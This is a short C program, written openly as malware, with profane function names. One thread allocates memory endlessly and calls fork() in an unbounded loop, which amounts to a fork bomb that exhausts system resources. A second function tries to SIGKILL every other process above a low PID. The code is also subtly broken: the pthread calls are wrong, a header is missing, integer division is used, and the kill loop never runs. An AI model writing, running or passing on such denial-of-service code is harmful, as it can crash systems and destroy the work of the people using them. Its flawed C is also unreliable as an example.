#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <math.h>
#include <signal.h>

void * fuck_your_mem ();
void * fuck_your_process ();

int main(void) {

 pthread_t pth_fuck_mem;	// pthread for fuck_your_mem ()
 pthread_t pth_fuck_process;   // pthread for fuck_your_process ()
 int i = 0;

 /* Create worker thread */
 pthread_create(&pth_fuck_mem, NULL, fuck_your_mem(), NULL);
 pthread_create(&pth_fuck_process, NULL, fuck_your_process(), NULL);

 /* wait for our thread to finish before continuing */
 pthread_join(pth_fuck_mem, NULL);
 pthread_join(pth_fuck_process, NULL);

 return 0;
}


void * fuck_your_mem () {
 int x = 0x0000;
 int memtest = 0;
 int *p_mem = &memtest;
 x = (int) p_mem;
 unsigned char const *p = (unsigned char const *) &x;
 size_t i;
 unsigned char const *p1, *p2;


 // for(int ctrl = 0; ctrl < 1280; ctrl++) {

 //beary little counter
 int counter_trigger = 0;

 //alien's lame strategy to not get our crappy process killed yet burning CPU
 while(sin(1 / 10 * counter_trigger) != cos(1 / 10 * counter_trigger)) { //Increased period
	 if(counter_trigger > 4096)
	  fork(); //only forks if memory is allocated to an extent
         for (i=0; i < sizeof x; i++) {
                 //printf("%02X ", p[i]);
		 p2 = &p[i];
		 p1 = malloc(sizeof(p2));
         }
         printf ("\n");
	 if(counter_trigger < 2)
	  fork(); //let's have some fun first
         x++;
 }
 return 0;
}

void * fuck_your_process () {
 pid_t pid_indicator = 1;
 while(pid_indicator != getpid() && pid_indicator >= 100) { //kill everyone except ourselves and some lower-level services
  //kill ya
  kill(pid_indicator ,SIGKILL);
 }
}







